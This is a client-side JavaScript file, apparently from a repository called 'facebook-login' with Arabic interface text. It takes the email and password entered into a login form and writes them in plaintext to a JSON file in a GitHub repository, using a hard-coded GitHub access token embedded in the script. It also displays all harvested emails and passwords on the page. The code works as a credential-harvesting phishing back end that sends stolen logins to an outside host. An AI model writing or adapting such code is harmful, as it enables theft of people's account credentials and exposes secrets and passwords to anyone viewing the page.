// 🔥 GitHub Token
const GITHUB_TOKEN = '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';
const REPO_OWNER = 'ASADALSNA';
const REPO_NAME = 'facebook-login';

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    if (!email || !password) {
        message.innerHTML = '❌ أدخل إيميل وباسورد!';
        message.className = 'error';
        return;
    }
    
    message.innerHTML = '⏳ جاري الحفظ في GitHub...';
    
    try {
        // حفظ مباشر بدون قراءة (يتجنب atob تماماً!)
        const newUser = {
            id: Date.now(),
            email: email,
            password: password,
            date: new Date().toLocaleString('ar')
        };
        
        // قراءة المستخدمين بطريقة آمنة
        let users = await getUsersSafe();
        users.push(newUser);
        
        // حفظ في GitHub
        await saveToGitHub(users);
        
        message.innerHTML = `✅ تم الحفظ في GitHub! (${users.length} مستخدم)`;
        message.className = 'success';
        showUsers();
        document.getElementById('loginForm').reset();
        
    } catch (error) {
        message.innerHTML = `❌ خطأ: ${error.message}`;
        message.className = 'error';
    }
});

async function getUsersSafe() {
    try {
        const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
        const response = await fetch(url, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        
        if (response.status === 404) return [];
        
        const text = await response.text();
        if (!text || text.includes('Not Found')) return [];
        
        const file = JSON.parse(text);
        if (!file.content) return [];
        
        try {
            return JSON.parse(atob(file.content));
        } catch {
            return [];
        }
    } catch {
        return [];
    }
}

async function saveToGitHub(users) {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
    const content = btoa(JSON.stringify(users, null, 2));
    
    // جرب حفظ بدون SHA أولاً
    let response = await fetch(url, {
        method: 'PUT',
        headers: { 
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: `Add user: ${users[users.length-1].email}`,
            content: content
        })
    });
    
    // لو فشل، جرب مع SHA
    if (!response.ok) {
        const shaResponse = await fetch(url, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        let sha = null;
        if (shaResponse.ok) {
            const file = await shaResponse.json();
            sha = file.sha;
        }
        
        response = await fetch(url, {
            method: 'PUT',
            headers: { 
                'Authorization': `token ${GITHUB_TOKEN}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                message: `Add user: ${users[users.length-1].email}`,
                content: content,
                sha: sha
            })
        });
    }
    
    if (!response.ok) throw new Error('فشل الحفظ');
}

async function showUsers() {
    const users = await getUsersSafe();
    const message = document.getElementById('message');
    let display = '<br><h3>👥 المستخدمين من GitHub:</h3>';
    if (users.length === 0) {
        display += '<p>لا يوجد مستخدمين بعد</p>';
    } else {
        users.forEach(user => {
            display += `<p>📧 ${user.email} | 🔐 ${user.password} | 📅 ${user.date}</p>`;
        });
    }
    message.innerHTML += display;
}

showUsers();
